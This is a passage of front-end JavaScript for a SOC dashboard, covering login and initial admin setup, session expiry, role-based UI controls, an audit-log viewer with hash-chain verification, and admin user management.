      showSetup: false,
      notice: wasExpired
        ? "Your SOC session has expired for security. Please sign in again."
        : "Authentication is required to continue.",
      noticeType: "warning"
    });
  } else {
    openAuthGate({ showSetup: false });
  }
}

function startSessionExpiryMonitor() {
  if (socSessionExpiryTimer) clearInterval(socSessionExpiryTimer);
  socSessionExpiryTimer = setInterval(() => {
    if (!socSessionExpiresAt || !socCurrentUser) return;
    if (Date.now() >= new Date(socSessionExpiresAt).getTime()) {
      handleSessionExpired(true);
    }
  }, 15000);
}

/**
 * Applies role-based UI visibility and read-only states for VIEWER accounts.
 * Backend RBAC remains the authoritative security enforcement boundary.
 */
function applyRbacUiVisibility() {
  const role = socCurrentUser?.role || "VIEWER";
  const canMutate = role === "ADMIN" || role === "ANALYST";

  // 1. Show/hide role-tagged navigation & action elements
  document.querySelectorAll("[data-roles]").forEach(el => {
    const allowed = (el.getAttribute("data-roles") || "").split(",").map(r => r.trim().toUpperCase());
    el.style.display = allowed.includes(role) ? "" : "none";
  });

  // 2. Render authenticated sidebar profile card
  const userCard = document.getElementById("sidebarUserCard");
  const avatarEl = document.getElementById("sidebarUserAvatar");
  const nameEl = document.getElementById("sidebarUserName");
  const roleEl = document.getElementById("sidebarUserRole");

  if (userCard && socCurrentUser) {
    userCard.style.display = "flex";
    const display = socCurrentUser.displayName || socCurrentUser.username;
    if (avatarEl) avatarEl.innerText = display.charAt(0).toUpperCase();
    if (nameEl) nameEl.innerText = display;
    if (roleEl) {
      roleEl.innerText = role;
      roleEl.className = `role-badge ${role.toLowerCase()}`;
    }
  }

  // 3. Disable mutating alert/incident UI controls for VIEWER role
  const mutatingSelectors = [
    "#alertModalStatusSelect",
    "#alertEscalateBtn",
    "#alertNewNoteText",
    "#incidentModalStatusSelect",
    "#incidentNewNoteText",
    "button[onclick='openCreateIncidentModal()']",
    "button[onclick='submitAlertNote()']",
    "button[onclick='submitIncidentNote()']"
  ];

  mutatingSelectors.forEach(sel => {
    const el = document.querySelector(sel);
    if (el) {
      el.disabled = !canMutate;
      el.title = canMutate ? "" : "Read-only VIEWER role cannot modify SOC records";
      el.style.opacity = canMutate ? "" : "0.5";
      el.style.cursor = canMutate ? "" : "not-allowed";
    }
  });

  // Lock note author fields to authenticated username (backend also enforces this)
  const alertAuthor = document.getElementById("alertNoteAuthor");
  const incAuthor = document.getElementById("incidentNoteAuthor");
  if (alertAuthor && socCurrentUser) {
    alertAuthor.value = socCurrentUser.username;
    alertAuthor.readOnly = true;
  }
  if (incAuthor && socCurrentUser) {
    incAuthor.value = socCurrentUser.username;
    incAuthor.readOnly = true;
  }
}

/**
 * Bootstraps authentication state on initial page load
 */
async function initSocAuthGate() {
  try {
    const meRes = await fetch(`${API_BASE}/api/auth/me`, {
      credentials: API_BASE ? "include" : "same-origin"
    });

    if (meRes.ok) {
      const json = await meRes.json();
      if (json.success && json.data?.user) {
        onAuthSuccess(json.data);
        return;
      }
    }

    // Check if first-run admin setup is required
    const statusRes = await fetch(`${API_BASE}/api/auth/status`, {
      credentials: API_BASE ? "include" : "same-origin"
    });
    const statusJson = statusRes.ok ? await statusRes.json() : {};
    const setupRequired = Boolean(statusJson.data?.setupRequired);

    openAuthGate({ showSetup: setupRequired });
  } catch (err) {
    openAuthGate({
      showSetup: false,
      notice: "Could not contact authentication service. Verify server connectivity.",
      noticeType: "error"
    });
  }
}

function onAuthSuccess(authData) {
  socCurrentUser = authData.user;
  socCsrfToken = authData.csrfToken || null;
  socSessionExpiresAt = authData.expiresAt || null;

  closeAuthGate();
  applyRbacUiVisibility();
  startSessionExpiryMonitor();

  const targetView = window.__pendingInitialView || "dashboard";
  window.__pendingInitialView = null;
  switchView(targetView, false);
  refreshAllDashboardData();
}

async function handleSocLogin(event) {
  event.preventDefault();
  const username = document.getElementById("loginUsername")?.value.trim() || "";
  const password = document.getElementById("loginPassword")?.value || "";
  const btn = document.getElementById("loginSubmitBtn");

  if (!username || !password) {
    showAuthGateNotice("Username and password are required.", "error");
    return;
  }

  if (btn) btn.disabled = true;
  showAuthGateNotice("");

  try {
    const res = await fetch(`${API_BASE}/api/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: API_BASE ? "include" : "same-origin",
      body: JSON.stringify({ username, password })
    });

    const json = await res.json();
    if (!res.ok || !json.success) {
      showAuthGateNotice(json.error || "Authentication failed.", res.status === 423 || res.status === 429 ? "warning" : "error");
      return;
    }

    const pwEl = document.getElementById("loginPassword");
    if (pwEl) pwEl.value = "";
    onAuthSuccess(json.data);
  } catch (err) {
    showAuthGateNotice("Network error while signing in.", "error");
  } finally {
    if (btn) btn.disabled = false;
  }
}

async function handleSocInitialSetup(event) {
  event.preventDefault();
  const username = document.getElementById("setupUsername")?.value.trim() || "";
  const email = document.getElementById("setupEmail")?.value.trim() || "";
  const password = document.getElementById("setupPassword")?.value || "";
  const btn = document.getElementById("setupSubmitBtn");

  if (btn) btn.disabled = true;
  showAuthGateNotice("");

  try {
    const res = await fetch(`${API_BASE}/api/auth/setup`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: API_BASE ? "include" : "same-origin",
      body: JSON.stringify({ username, email, password, displayName: "Primary SOC Administrator" })
    });

    const json = await res.json();
    if (!res.ok || !json.success) {
      showAuthGateNotice(json.error || "Initial setup failed.", "error");
      return;
    }

    const pwEl = document.getElementById("setupPassword");
    if (pwEl) pwEl.value = "";
    const loginUserEl = document.getElementById("loginUsername");
    if (loginUserEl) loginUserEl.value = username;

    openAuthGate({
      showSetup: false,
      notice: "Primary ADMIN account provisioned successfully. Sign in with your new credentials.",
      noticeType: "success"
    });
  } catch (err) {
    showAuthGateNotice("Network error during initial setup.", "error");
  } finally {
    if (btn) btn.disabled = false;
  }
}

async function handleSocLogout() {
  try {
    await socFetch(`${API_BASE}/api/auth/logout`, { method: "POST" });
  } catch (_) {}

  socCurrentUser = null;
  socCsrfToken = null;
  socSessionExpiresAt = null;
  if (socSessionExpiryTimer) {
    clearInterval(socSessionExpiryTimer);
    socSessionExpiryTimer = null;
  }

  const userCard = document.getElementById("sidebarUserCard");
  if (userCard) userCard.style.display = "none";

  openAuthGate({
    showSetup: false,
    notice: "You have signed out cleanly. Session invalidated.",
    noticeType: "success"
  });
}

// ================= IMMUTABLE AUDIT LOG CONSOLE =================
function handleAuditSearch() {
  clearTimeout(auditSearchDebounce);
  auditSearchDebounce = setTimeout(() => fetchSocAuditLogs(1), 300);
}

function changeAuditPage(delta) {
  const next = socAuditCurrentPage + delta;
  if (next >= 1 && next <= socAuditTotalPages) {
    fetchSocAuditLogs(next);
  }
}

async function fetchSocAuditLogs(page = 1) {
  if (!socCurrentUser) return;
  socAuditCurrentPage = page;

  const tbody = document.getElementById("auditTableBody");
  const emptyState = document.getElementById("auditEmptyState");
  const pageInfo = document.getElementById("auditPaginationInfo");
  const prevBtn = document.getElementById("auditPrevBtn");
  const nextBtn = document.getElementById("auditNextBtn");

  const username = document.getElementById("auditActorFilter")?.value.trim() || "";
  const entityType = document.getElementById("auditEntityFilter")?.value || "";
  const outcome = document.getElementById("auditOutcomeFilter")?.value || "";

  const params = new URLSearchParams({ page: String(page), limit: "20" });
  if (username) params.append("username", username);
  if (entityType) params.append("entityType", entityType);
  if (outcome) params.append("outcome", outcome);

  try {
    const res = await socFetch(`${API_BASE}/api/soc/audit?${params.toString()}`);
    if (!res || !res.ok) return;
    const json = await res.json();
    const logs = json.data || [];
    const pag = json.pagination || { totalPages: 1, total: 0 };
    socAuditTotalPages = pag.totalPages || 1;

    if (pageInfo) pageInfo.innerText = `Page ${page} of ${socAuditTotalPages} (${pag.total} audit events)`;
    if (prevBtn) prevBtn.disabled = page <= 1;
    if (nextBtn) nextBtn.disabled = page >= socAuditTotalPages;

    if (!logs.length) {
      if (tbody) tbody.innerHTML = "";
      if (emptyState) emptyState.style.display = "block";
      return;
    }

    if (emptyState) emptyState.style.display = "none";
    if (tbody) {
      tbody.innerHTML = logs.map(rec => {
        const ts = rec.timestamp ? new Date(rec.timestamp).toLocaleString() : "--";
        const roleClass = (rec.actor?.role || "viewer").toLowerCase();
        const outcomeClass = (rec.outcome || "success").toLowerCase();
        const hashShort = rec.integrityHash ? `${rec.integrityHash.slice(0, 12)}...` : "--";

        return `
          <tr>
            <td class="soc-date-cell">${escapeHtml(ts)}</td>
            <td>
              <div style="font-weight:600; font-size:12.5px;">${escapeHtml(rec.actor?.username || "system")}</div>
              <span class="role-badge ${escapeHtml(roleClass)}">${escapeHtml(rec.actor?.role || "SYSTEM")}</span>
            </td>
            <td><span class="vector-chip">${escapeHtml(rec.action)}</span></td>
            <td>
              <div style="font-size:12px; color:var(--text-main);">${escapeHtml(rec.entityType)}</div>
              <div class="soc-date-cell">${escapeHtml(rec.entityId || "--")}</div>
            </td>
            <td><span class="audit-outcome ${escapeHtml(outcomeClass)}">${escapeHtml(rec.outcome)}</span></td>
            <td style="font-size:12px; color:var(--text-secondary); max-width:300px;">${escapeHtml(rec.details || "")}</td>
            <td class="mono soc-date-cell" title="${escapeHtml(rec.integrityHash || "")}">${escapeHtml(hashShort)}</td>
          </tr>
        `;
      }).join("");
    }
  } catch (err) {
    console.warn("[Audit Console] Fetch error:", err.message);
  }
}

async function verifySocAuditChain() {
  try {
    const res = await socFetch(`${API_BASE}/api/soc/audit/verify`);
    if (!res || !res.ok) return;
    const json = await res.json();
    const report = json.data || {};

    showSocAlert({
      icon: report.verified ? "success" : "error",
      title: report.verified ? "Audit Chain Integrity Verified" : "Integrity Violation Detected",
      text: report.verified
        ? `All ${report.totalRecords} immutable audit records verified with intact SHA-256 cryptographic hash chain.`
        : `${report.tamperedRecords?.length || 0} record(s) failed integrity verification.`
    });
  } catch (err) {
    showSocAlert({ icon: "error", title: "Verification Error", text: err.message });
  }
}

// ================= ADMIN USER & RBAC MANAGEMENT CONSOLE =================
async function fetchSocUsers() {
  if (!socCurrentUser || socCurrentUser.role !== "ADMIN") return;
  const tbody = document.getElementById("usersTableBody");
  if (!tbody) return;

  try {
    const res = await socFetch(`${API_BASE}/api/auth/users`);
    if (!res || !res.ok) return;
    const json = await res.json();
    const users = json.data || [];

    tbody.innerHTML = users.map(u => {
      const isSelf = u.userId === socCurrentUser.userId;
      const isLocked = u.lockUntil && new Date(u.lockUntil).getTime() > Date.now();
      const lastLogin = u.lastLoginAt ? new Date(u.lastLoginAt).toLocaleString() : "Never";

      return `
        <tr>
          <td>
            <div style="font-weight:600; color:var(--text-main);">${escapeHtml(u.username)} ${isSelf ? '<span class="soc-date-cell">(You)</span>' : ''}</div>
            <div class="soc-date-cell">${escapeHtml(u.displayName || "")}</div>
          </td>
          <td class="soc-date-cell">${escapeHtml(u.email)}</td>
          <td>
            <select class="soc-select-filter" ${isSelf ? "disabled" : ""} onchange="updateSocUserRole('${escapeHtml(u.userId)}', this.value)">
              <option value="ADMIN" ${u.role === "ADMIN" ? "selected" : ""}>ADMIN</option>
              <option value="ANALYST" ${u.role === "ANALYST" ? "selected" : ""}>ANALYST</option>
              <option value="VIEWER" ${u.role === "VIEWER" ? "selected" : ""}>VIEWER</option>
            </select>
          </td>
          <td>
            ${isLocked
              ? `<span class="audit-outcome denied">LOCKED</span>`
              : u.active
                ? `<span class="audit-outcome success">ACTIVE</span>`
                : `<span class="audit-outcome failure">DISABLED</span>`}
          </td>
          <td class="soc-date-cell">${escapeHtml(lastLogin)}</td>
          <td class="soc-actions-cell">
            ${isLocked ? `<button class="btn btn-sm btn-outline" onclick="unlockSocUser('${escapeHtml(u.userId)}')">Unlock</button>` : ""}
            <button class="btn btn-sm btn-outline" ${isSelf ? "disabled" : ""} onclick="toggleSocUserActive('${escapeHtml(u.userId)}', ${!u.active})">
              ${u.active ? "Disable" : "Enable"}
            </button>
            <button class="btn btn-sm btn-secondary" ${isSelf ? "disabled" : ""} onclick="deleteSocUser('${escapeHtml(u.userId)}', '${escapeHtml(u.username)}')">
              Delete
            </button>
          </td>
        </tr>
      `;
    }).join("");
    refreshIcons();
  } catch (err) {
    console.warn("[Users Console] Fetch error:", err.message);
  }
}

function openCreateUserModal() {
  const modal = document.getElementById("createUserModal");
  if (modal) modal.classList.add("active");
}

function closeCreateUserModal() {
  const modal = document.getElementById("createUserModal");
  if (modal) modal.classList.remove("active");
}

async function submitCreateUser() {
  const username = document.getElementById("newUserUsername")?.value.trim() || "";
  const email = document.getElementById("newUserEmail")?.value.trim() || "";
  const displayName = document.getElementById("newUserDisplayName")?.value.trim() || "";
  const role = document.getElementById("newUserRole")?.value || "ANALYST";
  const password = document.getElementById("newUserPassword")?.value || "";

  try {
    const res = await socFetch(`${API_BASE}/api/auth/users`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, email, displayName, role, password })
    });
    const json = await res.json();
    if (!res.ok || !json.success) {
      showSocAlert({ icon: "error", title: "Provisioning Failed", text: json.error || "Could not create user." });
      return;
    }

    document.getElementById("newUserUsername").value = "";
    document.getElementById("newUserEmail").value = "";
    document.getElementById("newUserDisplayName").value = "";
    document.getElementById("newUserPassword").value = "";
    closeCreateUserModal();
    fetchSocUsers();
    showSocAlert({ icon: "success", title: "User Provisioned", text: `Account '${username}' created with role ${role}.` });
  } catch (err) {
    showSocAlert({ icon: "error", title: "Error", text: err.message });
  }
}

async function updateSocUserRole(userId, newRole) {
  const res = await socFetch(`${API_BASE}/api/auth/users/${encodeURIComponent(userId)}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ role: newRole })
  });
  const json = await res.json();
  if (!res.ok) {
    showSocAlert({ icon: "error", title: "Role Update Failed", text: json.error || "Failed to update role." });
  }
  fetchSocUsers();
}

async function toggleSocUserActive(userId, active) {
  const res = await socFetch(`${API_BASE}/api/auth/users/${encodeURIComponent(userId)}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ active })
  });
  const json = await res.json();
  if (!res.ok) {
    showSocAlert({ icon: "error", title: "Update Failed", text: json.error || "Failed to change status." });
  }
  fetchSocUsers();
}

async function unlockSocUser(userId) {
  const res = await socFetch(`${API_BASE}/api/auth/users/${encodeURIComponent(userId)}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ unlock: true })
  });
  if (res.ok) fetchSocUsers();
}

async function deleteSocUser(userId, username) {
  const confirmed = await showSocConfirm({
    title: "Delete User Account",
    text: `Permanently delete '${username}' and revoke all active sessions?`,
    confirmText: "Delete User"
  });
  if (!confirmed) return;

  const res = await socFetch(`${API_BASE}/api/auth/users/${encodeURIComponent(userId)}`, {
    method: "DELETE"
  });
  const json = await res.json();
  if (!res.ok) {
    showSocAlert({ icon: "error", title: "Deletion Failed", text: json.error || "Could not delete user." });
  }
  fetchSocUsers();
}


